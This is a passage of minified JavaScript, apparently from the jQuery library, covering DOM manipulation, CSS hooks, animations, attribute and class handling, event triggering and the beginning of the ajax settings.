Ut(this, t)).insertBefore(t, e.firstChild) }) }, before: function () { return Ht(this, arguments, function (t) { this.parentNode && this.parentNode.insertBefore(t, this) }) }, after: function () { return Ht(this, arguments, function (t) { this.parentNode && this.parentNode.insertBefore(t, this.nextSibling) }) }, empty: function () { for (var t, e = 0; null != (t = this[e]); e++)1 === t.nodeType && (F.cleanData(At(t, !1)), t.textContent = ""); return this }, clone: function (t, e) { return t = null != t && t, e = null == e ? t : e, this.map(function () { return F.clone(this, t, e) }) }, html: function (t) { return _(this, function (t) { var e = this[0] || {}, n = 0, i = this.length; if (void 0 === t && 1 === e.nodeType) return e.innerHTML; if ("string" == typeof t && !kt.test(t) && !Ct[(ht.exec(t) || ["", ""])[1].toLowerCase()]) { t = F.htmlPrefilter(t); try { for (; n < i; n++)1 === (e = this[n] || {}).nodeType && (F.cleanData(At(e, !1)), e.innerHTML = t); e = 0 } catch (t) { } } e && this.empty().append(t) }, null, t, arguments.length) }, replaceWith: function () { var n = []; return Ht(this, arguments, function (t) { var e = this.parentNode; F.inArray(this, n) < 0 && (F.cleanData(At(this)), e && e.replaceChild(t, this)) }, n) } }), F.each({ appendTo: "append", prependTo: "prepend", insertBefore: "before", insertAfter: "after", replaceAll: "replaceWith" }, function (t, s) { F.fn[t] = function (t) { for (var e, n = [], i = F(t), o = i.length - 1, a = 0; a <= o; a++)e = a === o ? this : this.clone(!0), F(i[a])[s](e), g.apply(n, e.get()); return this.pushStack(n) } }); var Rt, Yt, Ot, _t, Vt, Lt, Mt, zt = new RegExp("^(" + et + ")(?!px)[a-z%]+$", "i"), Pt = function (t) { var e = t.ownerDocument.defaultView; return e && e.opener || (e = v), e.getComputedStyle(t) }, Kt = new RegExp(it.join("|"), "i"); function Jt() { var t; Mt && (Lt.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", Mt.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", ot.appendChild(Lt).appendChild(Mt), t = v.getComputedStyle(Mt), Rt = "1%" !== t.top, Vt = 12 === jt(t.marginLeft), Mt.style.right = "60%", _t = 36 === jt(t.right), Yt = 36 === jt(t.width), Mt.style.position = "absolute", Ot = 12 === jt(Mt.offsetWidth / 3), ot.removeChild(Lt), Mt = null) } function jt(t) { return Math.round(parseFloat(t)) } function $t(t, e, n) { var i, o, a, s, r = t.style; return (n = n || Pt(t)) && ("" !== (s = n.getPropertyValue(e) || n[e]) || at(t) || (s = F.style(t, e)), !m.pixelBoxStyles() && zt.test(s) && Kt.test(e) && (i = r.width, o = r.minWidth, a = r.maxWidth, r.minWidth = r.maxWidth = r.width = s, s = n.width, r.width = i, r.minWidth = o, r.maxWidth = a)), void 0 !== s ? s + "" : s } function qt(t, e) { return { get: function () { if (!t()) return (this.get = e).apply(this, arguments); delete this.get } } } Lt = x.createElement("div"), (Mt = x.createElement("div")).style && (Mt.style.backgroundClip = "content-box", Mt.cloneNode(!0).style.backgroundClip = "", m.clearCloneStyle = "content-box" === Mt.style.backgroundClip, F.extend(m, { boxSizingReliable: function () { return Jt(), Yt }, pixelBoxStyles: function () { return Jt(), _t }, pixelPosition: function () { return Jt(), Rt }, reliableMarginLeft: function () { return Jt(), Vt }, scrollboxSize: function () { return Jt(), Ot } })); var te = ["Webkit", "Moz", "ms"], ee = x.createElement("div").style, ne = {}; function ie(t) { var e = F.cssProps[t] || ne[t]; return e || (t in ee ? t : ne[t] = function (t) { for (var e = t[0].toUpperCase() + t.slice(1), n = te.length; n--;)if ((t = te[n] + e) in ee) return t }(t) || t) } var oe = /^(none|table(?!-c[ea]).+)/, ae = /^--/, se = { position: "absolute", visibility: "hidden", display: "block" }, re = { letterSpacing: "0", fontWeight: "400" }; function ge(t, e, n) { var i = nt.exec(e); return i ? Math.max(0, i[2] - (n || 0)) + (i[3] || "px") : e } function le(t, e, n, i, o, a) { var s = "width" === e ? 1 : 0, r = 0, g = 0; if (n === (i ? "border" : "content")) return 0; for (; s < 4; s += 2)"margin" === n && (g += F.css(t, n + it[s], !0, o)), i ? ("content" === n && (g -= F.css(t, "padding" + it[s], !0, o)), "margin" !== n && (g -= F.css(t, "border" + it[s] + "Width", !0, o))) : (g += F.css(t, "padding" + it[s], !0, o), "padding" !== n ? g += F.css(t, "border" + it[s] + "Width", !0, o) : r += F.css(t, "border" + it[s] + "Width", !0, o)); return !i && 0 <= a && (g += Math.max(0, Math.ceil(t["offset" + e[0].toUpperCase() + e.slice(1)] - a - g - r - .5)) || 0), g } function ce(t, e, n) { var i = Pt(t), o = (!m.boxSizingReliable() || n) && "border-box" === F.css(t, "boxSizing", !1, i), a = o, s = $t(t, e, i), r = "offset" + e[0].toUpperCase() + e.slice(1); if (zt.test(s)) { if (!n) return s; s = "auto" } return (!m.boxSizingReliable() && o || "auto" === s || !parseFloat(s) && "inline" === F.css(t, "display", !1, i)) && t.getClientRects().length && (o = "border-box" === F.css(t, "boxSizing", !1, i), (a = r in t) && (s = t[r])), (s = parseFloat(s) || 0) + le(t, e, n || (o ? "border" : "content"), a, i, s) + "px" } function Ie(t, e, n, i, o) { return new Ie.prototype.init(t, e, n, i, o) } F.extend({ cssHooks: { opacity: { get: function (t, e) { if (e) { var n = $t(t, "opacity"); return "" === n ? "1" : n } } } }, cssNumber: { animationIterationCount: !0, columnCount: !0, fillOpacity: !0, flexGrow: !0, flexShrink: !0, fontWeight: !0, gridArea: !0, gridColumn: !0, gridColumnEnd: !0, gridColumnStart: !0, gridRow: !0, gridRowEnd: !0, gridRowStart: !0, lineHeight: !0, opacity: !0, order: !0, orphans: !0, widows: !0, zIndex: !0, zoom: !0 }, cssProps: {}, style: function (t, e, n, i) { if (t && 3 !== t.nodeType && 8 !== t.nodeType && t.style) { var o, a, s, r = z(e), g = ae.test(e), l = t.style; if (g || (e = ie(r)), s = F.cssHooks[e] || F.cssHooks[r], void 0 === n) return s && "get" in s && void 0 !== (o = s.get(t, !1, i)) ? o : l[e]; "string" === (a = typeof n) && (o = nt.exec(n)) && o[1] && (n = lt(t, e, o), a = "number"), null != n && n == n && ("number" !== a || g || (n += o && o[3] || (F.cssNumber[r] ? "" : "px")), m.clearCloneStyle || "" !== n || 0 !== e.indexOf("background") || (l[e] = "inherit"), s && "set" in s && void 0 === (n = s.set(t, n, i)) || (g ? l.setProperty(e, n) : l[e] = n)) } }, css: function (t, e, n, i) { var o, a, s, r = z(e); return ae.test(e) || (e = ie(r)), (s = F.cssHooks[e] || F.cssHooks[r]) && "get" in s && (o = s.get(t, !0, n)), void 0 === o && (o = $t(t, e, i)), "normal" === o && e in re && (o = re[e]), "" === n || n ? (a = parseFloat(o), !0 === n || isFinite(a) ? a || 0 : o) : o } }), F.each(["height", "width"], function (t, g) { F.cssHooks[g] = { get: function (t, e, n) { if (e) return !oe.test(F.css(t, "display")) || t.getClientRects().length && t.getBoundingClientRect().width ? ce(t, g, n) : rt(t, se, function () { return ce(t, g, n) }) }, set: function (t, e, n) { var i, o = Pt(t), a = !m.scrollboxSize() && "absolute" === o.position, s = (a || n) && "border-box" === F.css(t, "boxSizing", !1, o), r = n ? le(t, g, n, s, o) : 0; return s && a && (r -= Math.ceil(t["offset" + g[0].toUpperCase() + g.slice(1)] - parseFloat(o[g]) - le(t, g, "border", !1, o) - .5)), r && (i = nt.exec(e)) && "px" !== (i[3] || "px") && (t.style[g] = e, e = F.css(t, g)), ge(0, e, r) } } }), F.cssHooks.marginLeft = qt(m.reliableMarginLeft, function (t, e) { if (e) return (parseFloat($t(t, "marginLeft")) || t.getBoundingClientRect().left - rt(t, { marginLeft: 0 }, function () { return t.getBoundingClientRect().left })) + "px" }), F.each({ margin: "", padding: "", border: "Width" }, function (o, a) { F.cssHooks[o + a] = { expand: function (t) { for (var e = 0, n = {}, i = "string" == typeof t ? t.split(" ") : [t]; e < 4; e++)n[o + it[e] + a] = i[e] || i[e - 2] || i[0]; return n } }, "margin" !== o && (F.cssHooks[o + a].set = ge) }), F.fn.extend({ css: function (t, e) { return _(this, function (t, e, n) { var i, o, a = {}, s = 0; if (Array.isArray(e)) { for (i = Pt(t), o = e.length; s < o; s++)a[e[s]] = F.css(t, e[s], !1, i); return a } return void 0 !== n ? F.style(t, e, n) : F.css(t, e) }, t, e, 1 < arguments.length) } }), (F.Tween = Ie).prototype = { constructor: Ie, init: function (t, e, n, i, o, a) { this.elem = t, this.prop = n, this.easing = o || F.easing._default, this.options = e, this.start = this.now = this.cur(), this.end = i, this.unit = a || (F.cssNumber[n] ? "" : "px") }, cur: function () { var t = Ie.propHooks[this.prop]; return t && t.get ? t.get(this) : Ie.propHooks._default.get(this) }, run: function (t) { var e, n = Ie.propHooks[this.prop]; return this.options.duration ? this.pos = e = F.easing[this.easing](t, this.options.duration * t, 0, 1, this.options.duration) : this.pos = e = t, this.now = (this.end - this.start) * e + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : Ie.propHooks._default.set(this), this } }, Ie.prototype.init.prototype = Ie.prototype, Ie.propHooks = { _default: { get: function (t) { var e; return 1 !== t.elem.nodeType || null != t.elem[t.prop] && null == t.elem.style[t.prop] ? t.elem[t.prop] : (e = F.css(t.elem, t.prop, "")) && "auto" !== e ? e : 0 }, set: function (t) { F.fx.step[t.prop] ? F.fx.step[t.prop](t) : 1 !== t.elem.nodeType || !F.cssHooks[t.prop] && null == t.elem.style[ie(t.prop)] ? t.elem[t.prop] = t.now : F.style(t.elem, t.prop, t.now + t.unit) } } }, Ie.propHooks.scrollTop = Ie.propHooks.scrollLeft = { set: function (t) { t.elem.nodeType && t.elem.parentNode && (t.elem[t.prop] = t.now) } }, F.easing = { linear: function (t) { return t }, swing: function (t) { return .5 - Math.cos(t * Math.PI) / 2 }, _default: "swing" }, F.fx = Ie.prototype.init, F.fx.step = {}; var ue, he, de, Ce, Ae = /^(?:toggle|show|hide)$/, pe = /queueHooks$/; function me() { he && (!1 === x.hidden && v.requestAnimationFrame ? v.requestAnimationFrame(me) : v.setTimeout(me, F.fx.interval), F.fx.tick()) } function fe() { return v.setTimeout(function () { ue = void 0 }), ue = Date.now() } function be(t, e) { var n, i = 0, o = { height: t }; for (e = e ? 1 : 0; i < 4; i += 2 - e)o["margin" + (n = it[i])] = o["padding" + n] = t; return e && (o.opacity = o.width = t), o } function Be(t, e, n) { for (var i, o = (ye.tweeners[e] || []).concat(ye.tweeners["*"]), a = 0, s = o.length; a < s; a++)if (i = o[a].call(n, e, t)) return i } function ye(a, t, e) { var n, s, i = 0, o = ye.prefilters.length, r = F.Deferred().always(function () { delete g.elem }), g = function () { if (s) return !1; for (var t = ue || fe(), e = Math.max(0, l.startTime + l.duration - t), n = 1 - (e / l.duration || 0), i = 0, o = l.tweens.length; i < o; i++)l.tweens[i].run(n); return r.notifyWith(a, [l, n, e]), n < 1 && o ? e : (o || r.notifyWith(a, [l, 1, 0]), r.resolveWith(a, [l]), !1) }, l = r.promise({ elem: a, props: F.extend({}, t), opts: F.extend(!0, { specialEasing: {}, easing: F.easing._default }, e), originalProperties: t, originalOptions: e, startTime: ue || fe(), duration: e.duration, tweens: [], createTween: function (t, e) { var n = F.Tween(a, l.opts, t, e, l.opts.specialEasing[t] || l.opts.easing); return l.tweens.push(n), n }, stop: function (t) { var e = 0, n = t ? l.tweens.length : 0; if (s) return this; for (s = !0; e < n; e++)l.tweens[e].run(1); return t ? (r.notifyWith(a, [l, 1, 0]), r.resolveWith(a, [l, t])) : r.rejectWith(a, [l, t]), this } }), c = l.props; for (!function (t, e) { var n, i, o, a, s; for (n in t) if (o = e[i = z(n)], a = t[n], Array.isArray(a) && (o = a[1], a = t[n] = a[0]), n !== i && (t[i] = a, delete t[n]), (s = F.cssHooks[i]) && "expand" in s) for (n in a = s.expand(a), delete t[i], a) n in t || (t[n] = a[n], e[n] = o); else e[i] = o }(c, l.opts.specialEasing); i < o; i++)if (n = ye.prefilters[i].call(l, a, c, l.opts)) return f(n.stop) && (F._queueHooks(l.elem, l.opts.queue).stop = n.stop.bind(n)), n; return F.map(c, Be, l), f(l.opts.start) && l.opts.start.call(a, l), l.progress(l.opts.progress).done(l.opts.done, l.opts.complete).fail(l.opts.fail).always(l.opts.always), F.fx.timer(F.extend(g, { elem: a, anim: l, queue: l.opts.queue })), l } F.Animation = F.extend(ye, { tweeners: { "*": [function (t, e) { var n = this.createTween(t, e); return lt(n.elem, t, nt.exec(e), n), n }] }, tweener: function (t, e) { for (var n, i = 0, o = (t = f(t) ? (e = t, ["*"]) : t.match(N)).length; i < o; i++)n = t[i], ye.tweeners[n] = ye.tweeners[n] || [], ye.tweeners[n].unshift(e) }, prefilters: [function (t, e, n) { var i, o, a, s, r, g, l, c, I = "width" in e || "height" in e, u = this, h = {}, d = t.style, C = t.nodeType && gt(t), A = J.get(t, "fxshow"); for (i in n.queue || (null == (s = F._queueHooks(t, "fx")).unqueued && (s.unqueued = 0, r = s.empty.fire, s.empty.fire = function () { s.unqueued || r() }), s.unqueued++, u.always(function () { u.always(function () { s.unqueued--, F.queue(t, "fx").length || s.empty.fire() }) })), e) if (o = e[i], Ae.test(o)) { if (delete e[i], a = a || "toggle" === o, o === (C ? "hide" : "show")) { if ("show" !== o || !A || void 0 === A[i]) continue; C = !0 } h[i] = A && A[i] || F.style(t, i) } if ((g = !F.isEmptyObject(e)) || !F.isEmptyObject(h)) for (i in I && 1 === t.nodeType && (n.overflow = [d.overflow, d.overflowX, d.overflowY], null == (l = A && A.display) && (l = J.get(t, "display")), "none" === (c = F.css(t, "display")) && (l ? c = l : (It([t], !0), l = t.style.display || l, c = F.css(t, "display"), It([t]))), ("inline" === c || "inline-block" === c && null != l) && "none" === F.css(t, "float") && (g || (u.done(function () { d.display = l }), null == l && (c = d.display, l = "none" === c ? "" : c)), d.display = "inline-block")), n.overflow && (d.overflow = "hidden", u.always(function () { d.overflow = n.overflow[0], d.overflowX = n.overflow[1], d.overflowY = n.overflow[2] })), g = !1, h) g || (A ? "hidden" in A && (C = A.hidden) : A = J.access(t, "fxshow", { display: l }), a && (A.hidden = !C), C && It([t], !0), u.done(function () { for (i in C || It([t]), J.remove(t, "fxshow"), h) F.style(t, i, h[i]) })), g = Be(C ? A[i] : 0, i, u), i in A || (A[i] = g.start, C && (g.end = g.start, g.start = 0)) }], prefilter: function (t, e) { e ? ye.prefilters.unshift(t) : ye.prefilters.push(t) } }), F.speed = function (t, e, n) { var i = t && "object" == typeof t ? F.extend({}, t) : { complete: n || !n && e || f(t) && t, duration: t, easing: n && e || e && !f(e) && e }; return F.fx.off ? i.duration = 0 : "number" != typeof i.duration && (i.duration in F.fx.speeds ? i.duration = F.fx.speeds[i.duration] : i.duration = F.fx.speeds._default), null != i.queue && !0 !== i.queue || (i.queue = "fx"), i.old = i.complete, i.complete = function () { f(i.old) && i.old.call(this), i.queue && F.dequeue(this, i.queue) }, i }, F.fn.extend({ fadeTo: function (t, e, n, i) { return this.filter(gt).css("opacity", 0).show().end().animate({ opacity: e }, t, n, i) }, animate: function (e, t, n, i) { function o() { var t = ye(this, F.extend({}, e), s); (a || J.get(this, "finish")) && t.stop(!0) } var a = F.isEmptyObject(e), s = F.speed(t, n, i); return o.finish = o, a || !1 === s.queue ? this.each(o) : this.queue(s.queue, o) }, stop: function (o, t, a) { function s(t) { var e = t.stop; delete t.stop, e(a) } return "string" != typeof o && (a = t, t = o, o = void 0), t && !1 !== o && this.queue(o || "fx", []), this.each(function () { var t = !0, e = null != o && o + "queueHooks", n = F.timers, i = J.get(this); if (e) i[e] && i[e].stop && s(i[e]); else for (e in i) i[e] && i[e].stop && pe.test(e) && s(i[e]); for (e = n.length; e--;)n[e].elem !== this || null != o && n[e].queue !== o || (n[e].anim.stop(a), t = !1, n.splice(e, 1)); !t && a || F.dequeue(this, o) }) }, finish: function (s) { return !1 !== s && (s = s || "fx"), this.each(function () { var t, e = J.get(this), n = e[s + "queue"], i = e[s + "queueHooks"], o = F.timers, a = n ? n.length : 0; for (e.finish = !0, F.queue(this, s, []), i && i.stop && i.stop.call(this, !0), t = o.length; t--;)o[t].elem === this && o[t].queue === s && (o[t].anim.stop(!0), o.splice(t, 1)); for (t = 0; t < a; t++)n[t] && n[t].finish && n[t].finish.call(this); delete e.finish }) } }), F.each(["toggle", "show", "hide"], function (t, i) { var o = F.fn[i]; F.fn[i] = function (t, e, n) { return null == t || "boolean" == typeof t ? o.apply(this, arguments) : this.animate(be(i, !0), t, e, n) } }), F.each({ slideDown: be("show"), slideUp: be("hide"), slideToggle: be("toggle"), fadeIn: { opacity: "show" }, fadeOut: { opacity: "hide" }, fadeToggle: { opacity: "toggle" } }, function (t, i) { F.fn[t] = function (t, e, n) { return this.animate(i, t, e, n) } }), F.timers = [], F.fx.tick = function () { var t, e = 0, n = F.timers; for (ue = Date.now(); e < n.length; e++)(t = n[e])() || n[e] !== t || n.splice(e--, 1); n.length || F.fx.stop(), ue = void 0 }, F.fx.timer = function (t) { F.timers.push(t), F.fx.start() }, F.fx.interval = 13, F.fx.start = function () { he || (he = !0, me()) }, F.fx.stop = function () { he = null }, F.fx.speeds = { slow: 600, fast: 200, _default: 400 }, F.fn.delay = function (i, t) { return i = F.fx && F.fx.speeds[i] || i, t = t || "fx", this.queue(t, function (t, e) { var n = v.setTimeout(t, i); e.stop = function () { v.clearTimeout(n) } }) }, de = x.createElement("input"), Ce = x.createElement("select").appendChild(x.createElement("option")), de.type = "checkbox", m.checkOn = "" !== de.value, m.optSelected = Ce.selected, (de = x.createElement("input")).value = "t", de.type = "radio", m.radioValue = "t" === de.value; var ve, xe = F.expr.attrHandle; F.fn.extend({ attr: function (t, e) { return _(this, F.attr, t, e, 1 < arguments.length) }, removeAttr: function (t) { return this.each(function () { F.removeAttr(this, t) }) } }), F.extend({ attr: function (t, e, n) { var i, o, a = t.nodeType; if (3 !== a && 8 !== a && 2 !== a) return void 0 === t.getAttribute ? F.prop(t, e, n) : (1 === a && F.isXMLDoc(t) || (o = F.attrHooks[e.toLowerCase()] || (F.expr.match.bool.test(e) ? ve : void 0)), void 0 !== n ? null === n ? void F.removeAttr(t, e) : o && "set" in o && void 0 !== (i = o.set(t, n, e)) ? i : (t.setAttribute(e, n + ""), n) : !(o && "get" in o && null !== (i = o.get(t, e))) && null == (i = F.find.attr(t, e)) ? void 0 : i) }, attrHooks: { type: { set: function (t, e) { if (!m.radioValue && "radio" === e && w(t, "input")) { var n = t.value; return t.setAttribute("type", e), n && (t.value = n), e } } } }, removeAttr: function (t, e) { var n, i = 0, o = e && e.match(N); if (o && 1 === t.nodeType) for (; n = o[i++];)t.removeAttribute(n) } }), ve = { set: function (t, e, n) { return !1 === e ? F.removeAttr(t, n) : t.setAttribute(n, n), n } }, F.each(F.expr.match.bool.source.match(/\w+/g), function (t, e) { var s = xe[e] || F.find.attr; xe[e] = function (t, e, n) { var i, o, a = e.toLowerCase(); return n || (o = xe[a], xe[a] = i, i = null != s(t, e, n) ? a : null, xe[a] = o), i } }); var Fe = /^(?:input|select|textarea|button)$/i, Qe = /^(?:a|area)$/i; function Ge(t) { return (t.match(N) || []).join(" ") } function we(t) { return t.getAttribute && t.getAttribute("class") || "" } function Xe(t) { return Array.isArray(t) ? t : "string" == typeof t && t.match(N) || [] } F.fn.extend({ prop: function (t, e) { return _(this, F.prop, t, e, 1 < arguments.length) }, removeProp: function (t) { return this.each(function () { delete this[F.propFix[t] || t] }) } }), F.extend({ prop: function (t, e, n) { var i, o, a = t.nodeType; if (3 !== a && 8 !== a && 2 !== a) return 1 === a && F.isXMLDoc(t) || (e = F.propFix[e] || e, o = F.propHooks[e]), void 0 !== n ? o && "set" in o && void 0 !== (i = o.set(t, n, e)) ? i : t[e] = n : o && "get" in o && null !== (i = o.get(t, e)) ? i : t[e] }, propHooks: { tabIndex: { get: function (t) { var e = F.find.attr(t, "tabindex"); return e ? parseInt(e, 10) : Fe.test(t.nodeName) || Qe.test(t.nodeName) && t.href ? 0 : -1 } } }, propFix: { for: "htmlFor", class: "className" } }), m.optSelected || (F.propHooks.selected = { get: function (t) { var e = t.parentNode; return e && e.parentNode && e.parentNode.selectedIndex, null }, set: function (t) { var e = t.parentNode; e && (e.selectedIndex, e.parentNode && e.parentNode.selectedIndex) } }), F.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () { F.propFix[this.toLowerCase()] = this }), F.fn.extend({ addClass: function (e) { var t, n, i, o, a, s, r, g = 0; if (f(e)) return this.each(function (t) { F(this).addClass(e.call(this, t, we(this))) }); if ((t = Xe(e)).length) for (; n = this[g++];)if (o = we(n), i = 1 === n.nodeType && " " + Ge(o) + " ") { for (s = 0; a = t[s++];)i.indexOf(" " + a + " ") < 0 && (i += a + " "); o !== (r = Ge(i)) && n.setAttribute("class", r) } return this }, removeClass: function (e) { var t, n, i, o, a, s, r, g = 0; if (f(e)) return this.each(function (t) { F(this).removeClass(e.call(this, t, we(this))) }); if (!arguments.length) return this.attr("class", ""); if ((t = Xe(e)).length) for (; n = this[g++];)if (o = we(n), i = 1 === n.nodeType && " " + Ge(o) + " ") { for (s = 0; a = t[s++];)for (; -1 < i.indexOf(" " + a + " ");)i = i.replace(" " + a + " ", " "); o !== (r = Ge(i)) && n.setAttribute("class", r) } return this }, toggleClass: function (o, e) { var a = typeof o, s = "string" == a || Array.isArray(o); return "boolean" == typeof e && s ? e ? this.addClass(o) : this.removeClass(o) : f(o) ? this.each(function (t) { F(this).toggleClass(o.call(this, t, we(this), e), e) }) : this.each(function () { var t, e, n, i; if (s) for (e = 0, n = F(this), i = Xe(o); t = i[e++];)n.hasClass(t) ? n.removeClass(t) : n.addClass(t); else void 0 !== o && "boolean" != a || ((t = we(this)) && J.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", !t && !1 !== o && J.get(this, "__className__") || "")) }) }, hasClass: function (t) { for (var e, n = 0, i = " " + t + " "; e = this[n++];)if (1 === e.nodeType && -1 < (" " + Ge(we(e)) + " ").indexOf(i)) return !0; return !1 } }); var Se = /\r/g; F.fn.extend({ val: function (n) { var i, t, o, e = this[0]; return arguments.length ? (o = f(n), this.each(function (t) { var e; 1 === this.nodeType && (null == (e = o ? n.call(this, t, F(this).val()) : n) ? e = "" : "number" == typeof e ? e += "" : Array.isArray(e) && (e = F.map(e, function (t) { return null == t ? "" : t + "" })), (i = F.valHooks[this.type] || F.valHooks[this.nodeName.toLowerCase()]) && "set" in i && void 0 !== i.set(this, e, "value") || (this.value = e)) })) : e ? (i = F.valHooks[e.type] || F.valHooks[e.nodeName.toLowerCase()]) && "get" in i && void 0 !== (t = i.get(e, "value")) ? t : "string" == typeof (t = e.value) ? t.replace(Se, "") : null == t ? "" : t : void 0 } }), F.extend({ valHooks: { option: { get: function (t) { var e = F.find.attr(t, "value"); return null != e ? e : Ge(F.text(t)) } }, select: { get: function (t) { for (var e, n, i = t.options, o = t.selectedIndex, a = "select-one" === t.type, s = a ? null : [], r = a ? o + 1 : i.length, g = o < 0 ? r : a ? o : 0; g < r; g++)if (((n = i[g]).selected || g === o) && !n.disabled && (!n.parentNode.disabled || !w(n.parentNode, "optgroup"))) { if (e = F(n).val(), a) return e; s.push(e) } return s }, set: function (t, e) { for (var n, i, o = t.options, a = F.makeArray(e), s = o.length; s--;)((i = o[s]).selected = -1 < F.inArray(F.valHooks.option.get(i), a)) && (n = !0); return n || (t.selectedIndex = -1), a } } } }), F.each(["radio", "checkbox"], function () { F.valHooks[this] = { set: function (t, e) { if (Array.isArray(e)) return t.checked = -1 < F.inArray(F(t).val(), e) } }, m.checkOn || (F.valHooks[this].get = function (t) { return null === t.getAttribute("value") ? "on" : t.value }) }), m.focusin = "onfocusin" in v; function ke(t) { t.stopPropagation() } var De = /^(?:focusinfocus|focusoutblur)$/; F.extend(F.event, { trigger: function (t, e, n, i) { var o, a, s, r, g, l, c, I = [n || x], u = p.call(t, "type") ? t.type : t, h = p.call(t, "namespace") ? t.namespace.split(".") : [], d = c = a = n = n || x; if (3 !== n.nodeType && 8 !== n.nodeType && !De.test(u + F.event.triggered) && (-1 < u.indexOf(".") && (u = (h = u.split(".")).shift(), h.sort()), r = u.indexOf(":") < 0 && "on" + u, (t = t[F.expando] ? t : new F.Event(u, "object" == typeof t && t)).isTrigger = i ? 2 : 3, t.namespace = h.join("."), t.rnamespace = t.namespace ? new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, t.result = void 0, t.target || (t.target = n), e = null == e ? [t] : F.makeArray(e, [t]), l = F.event.special[u] || {}, i || !l.trigger || !1 !== l.trigger.apply(n, e))) { if (!i && !l.noBubble && !C(n)) { for (s = l.delegateType || u, De.test(s + u) || (d = d.parentNode); d; d = d.parentNode)I.push(d), a = d; a === (n.ownerDocument || x) && I.push(a.defaultView || a.parentWindow || v) } for (o = 0; (d = I[o++]) && !t.isPropagationStopped();)c = d, t.type = 1 < o ? s : l.bindType || u, (g = (J.get(d, "events") || {})[t.type] && J.get(d, "handle")) && g.apply(d, e), (g = r && d[r]) && g.apply && P(d) && (t.result = g.apply(d, e), !1 === t.result && t.preventDefault()); return t.type = u, i || t.isDefaultPrevented() || l._default && !1 !== l._default.apply(I.pop(), e) || !P(n) || r && f(n[u]) && !C(n) && ((a = n[r]) && (n[r] = null), F.event.triggered = u, t.isPropagationStopped() && c.addEventListener(u, ke), n[u](), t.isPropagationStopped() && c.removeEventListener(u, ke), F.event.triggered = void 0, a && (n[r] = a)), t.result } }, simulate: function (t, e, n) { var i = F.extend(new F.Event, n, { type: t, isSimulated: !0 }); F.event.trigger(i, null, e) } }), F.fn.extend({ trigger: function (t, e) { return this.each(function () { F.event.trigger(t, e, this) }) }, triggerHandler: function (t, e) { var n = this[0]; if (n) return F.event.trigger(t, e, n, !0) } }), m.focusin || F.each({ focus: "focusin", blur: "focusout" }, function (n, i) { function o(t) { F.event.simulate(i, t.target, F.event.fix(t)) } F.event.special[i] = { setup: function () { var t = this.ownerDocument || this, e = J.access(t, i); e || t.addEventListener(n, o, !0), J.access(t, i, (e || 0) + 1) }, teardown: function () { var t = this.ownerDocument || this, e = J.access(t, i) - 1; e ? J.access(t, i, e) : (t.removeEventListener(n, o, !0), J.remove(t, i)) } } }); var Ze = v.location, Ue = Date.now(), We = /\?/; F.parseXML = function (t) { var e; if (!t || "string" != typeof t) return null; try { e = (new v.DOMParser).parseFromString(t, "text/xml") } catch (t) { e = void 0 } return e && !e.getElementsByTagName("parsererror").length || F.error("Invalid XML: " + t), e }; var Ne = /\[\]$/, Te = /\r?\n/g, He = /^(?:submit|button|image|reset|file)$/i, Ee = /^(?:input|select|textarea|keygen)/i; F.param = function (t, e) { function n(t, e) { var n = f(e) ? e() : e; o[o.length] = encodeURIComponent(t) + "=" + encodeURIComponent(null == n ? "" : n) } var i, o = []; if (null == t) return ""; if (Array.isArray(t) || t.jquery && !F.isPlainObject(t)) F.each(t, function () { n(this.name, this.value) }); else for (i in t) !function n(i, t, o, a) { var e; if (Array.isArray(t)) F.each(t, function (t, e) { o || Ne.test(i) ? a(i, e) : n(i + "[" + ("object" == typeof e && null != e ? t : "") + "]", e, o, a) }); else if (o || "object" !== B(t)) a(i, t); else for (e in t) n(i + "[" + e + "]", t[e], o, a) }(i, t[i], e, n); return o.join("&") }, F.fn.extend({ serialize: function () { return F.param(this.serializeArray()) }, serializeArray: function () { return this.map(function () { var t = F.prop(this, "elements"); return t ? F.makeArray(t) : this }).filter(function () { var t = this.type; return this.name && !F(this).is(":disabled") && Ee.test(this.nodeName) && !He.test(t) && (this.checked || !ut.test(t)) }).map(function (t, e) { var n = F(this).val(); return null == n ? null : Array.isArray(n) ? F.map(n, function (t) { return { name: e.name, value: t.replace(Te, "\r\n") } }) : { name: e.name, value: n.replace(Te, "\r\n") } }).get() } }); var Re = /%20/g, Ye = /#.*$/, Oe = /([?&])_=[^&]*/, _e = /^(.*?):[ \t]*([^\r\n]*)$/gm, Ve = /^(?:GET|HEAD)$/, Le = /^\/\//, Me = {}, ze = {}, Pe = "*/".concat("*"), Ke = x.createElement("a"); function Je(a) { return function (t, e) { "string" != typeof t && (e = t, t = "*"); var n, i = 0, o = t.toLowerCase().match(N) || []; if (f(e)) for (; n = o[i++];)"+" === n[0] ? (n = n.slice(1) || "*", (a[n] = a[n] || []).unshift(e)) : (a[n] = a[n] || []).push(e) } } function je(e, o, a, s) { var r = {}, g = e === ze; function l(t) { var i; return r[t] = !0, F.each(e[t] || [], function (t, e) { var n = e(o, a, s); return "string" != typeof n || g || r[n] ? g ? !(i = n) : void 0 : (o.dataTypes.unshift(n), l(n), !1) }), i } return l(o.dataTypes[0]) || !r["*"] && l("*") } function $e(t, e) { var n, i, o = F.ajaxSettings.flatOptions || {}; for (n in e) void 0 !== e[n] && ((o[n] ? t : i = i || {})[n] = e[n]); return i && F.extend(!0, t, i), t } Ke.href = Ze.href, F.extend({ active: 0, lastModified: {}, etag: {}, ajaxSettings: { url: Ze.href, type: "GET", isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Ze.protocol), global: !0, processData: !0, async: !0, contentType: "application/x-www-form-urlencoded; charset=UTF-8", accepts: { "*": Pe, text: "text/plain", html: "text/html", xml: "application/xml, text/xml", json: "application/json, text/javascript" }, contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ }, responseFields: { xml: "responseXML", text: "responseText", json: "responseJSON" }, converters: { "* text": String, "text html": !0, "text json": JSON.parse, "text xml": F.parseXML }, flatOptions: { url: !0, context: !0 } }, ajaxSetup: function (t, e) { return e ? $e($e(t, F.ajaxSettings), e) : $e(F.ajaxSettings, t) }, 